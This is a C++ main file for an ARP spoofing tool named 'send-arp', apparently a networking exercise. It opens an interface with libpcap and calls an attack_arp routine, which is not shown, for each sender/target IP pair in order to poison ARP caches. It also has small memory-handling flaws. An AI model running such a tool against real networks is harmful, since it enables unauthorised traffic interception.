#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdlib.h>
#include "ethernet.h"
#include "packet.h"
#include <string>
#include <sys/types.h>
#include <unistd.h>
#include "ethernet.h"
#include "arp.h"
#include "packet.h"
#include "attack.h"
#include "mac.h"
#include "ip.h"


void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");


}
int check_arg(int argc, char*argv){
    if(argc < 4 ){
        usage();
        return EXIT_FAILURE;
    }
    else if((argc % 2 != 0)){
        usage();
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}




int main(int argc, char* argv[]) {
    if(check_arg(argc, *argv)){
        return EXIT_FAILURE;
    }


    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    // pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    uint16_t couple = (argc - 2)/2;
    ArpPacket** arpPacket = (ArpPacket**)malloc(sizeof(ArpPacket)* couple);
    Mac** mac = (Mac**)malloc(sizeof(Mac)*couple);

    //Attack send -arp
    for(int i=0;i<couple; i++){
        char* sender_ip = argv[i*2 + 2];
        char* target_ip = argv[i*2 + 3];
        mac[i] = (Mac*)malloc(sizeof(Mac));
        arpPacket[i] = attack_arp(dev,sender_ip , target_ip, pcap, mac[i]);
    }

    //Set Info
    Info info(dev, *arpPacket[0], mac[0]);
    info.print_info();

    //packet check
    const u_char* packet;
    Ethernet* ethernet ;

    // while (true) {
    //     struct pcap_pkthdr* header;
    //     // printf("\nWHERE");
    //
    //     int res = pcap_next_ex(pcap, &header, &packet);
    //     if (res == 0){
    //         continue; //time out
    //     } else if(res <0){ // error
    //         printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
    //         break;
    //     }
    //
    //
    //
    //     ethernet = (Ethernet*) packet;
    //     ethernet->print_ethernet();
    //     stoi_mac(mac_, tmp);
    //     if(ethernet->get_ether_type() != 0x0806){
    //         continue;
    //     }
    //     else if(ethernet->get_d_mac() == tmp){
    //         continue;
    //     }
    //     break;
    // }




    free(mac);
    free(arpPacket);
    pcap_close(pcap);
}
